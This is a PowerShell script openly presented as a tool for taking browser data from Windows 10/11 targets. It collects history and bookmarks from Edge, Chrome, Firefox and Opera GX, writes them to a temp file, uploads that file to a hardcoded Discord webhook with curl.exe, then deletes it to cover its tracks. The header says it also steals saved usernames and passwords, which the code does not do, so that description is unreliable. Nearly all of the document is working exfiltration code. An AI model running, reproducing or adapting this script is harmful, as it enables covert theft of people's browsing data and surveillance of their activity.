# Title: Browser Data Exfiltration with Remote Script Execution
# Author: Jakoby
# Description: This script extracts browser history, bookmarks, and saved usernames/passwords from IE, Chrome, Firefox, and Opera GX on Windows 10/11 targets.

# Target OS: Windows 10, 11

function Get-BrowserData {
    [CmdletBinding()]
    param (
        [Parameter(Position = 1, Mandatory = $True)]
        [string]$Browser,
        [Parameter(Position = 2, Mandatory = $True)]
        [string]$DataType
    )

    $Path = switch ($Browser) {
        'chrome'  { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" } }
        'edge'    { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History" } elseif ($DataType -eq 'bookmarks') { "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" } }
        'firefox' { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite" } }
        'opera'   { if ($DataType -eq 'history') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History" } elseif ($DataType -eq 'bookmarks') { "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks" } }
        default { Write-Host 'Unsupported browser or data type specified'; return }
    }

    if (-not (Test-Path $Path)) {
        Write-Host "The path for $Browser $DataType could not be found."
        return
    }

    try {
        $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
        $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | ForEach-Object { ($_.Matches).Value } | Sort -Unique
        $Value | ForEach-Object {
            $Key = $_
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } catch {
        Write-Host "Failed to extract $DataType from $Browser"
    }
}

# Define exfiltration method (Discord webhook)
$dc = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'

# Check if Discord webhook is set
if ([string]::IsNullOrEmpty($dc)) {
    Write-Host 'No exfiltration method set. Exiting.'
    exit
}

# Collect browser data
$outputFile = "$env:TMP\--BrowserData.txt"
Get-BrowserData -Browser "edge" -DataType "history" >> $outputFile
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "history" >> $outputFile
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $outputFile
Get-BrowserData -Browser "firefox" -DataType "history" >> $outputFile
Get-BrowserData -Browser "opera" -DataType "history" >> $outputFile
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $outputFile

# Send completion notification to Discord
try {
    $body = @{ "content" = 'Browser data exfiltration script executed successfully, including browser data.' } | ConvertTo-Json
    Invoke-RestMethod -Uri $dc -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing
    curl.exe -F "file1=@$outputFile" $dc
} catch {
    Write-Host 'Failed to send notification to Discord webhook.'
}

# Clean up
Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
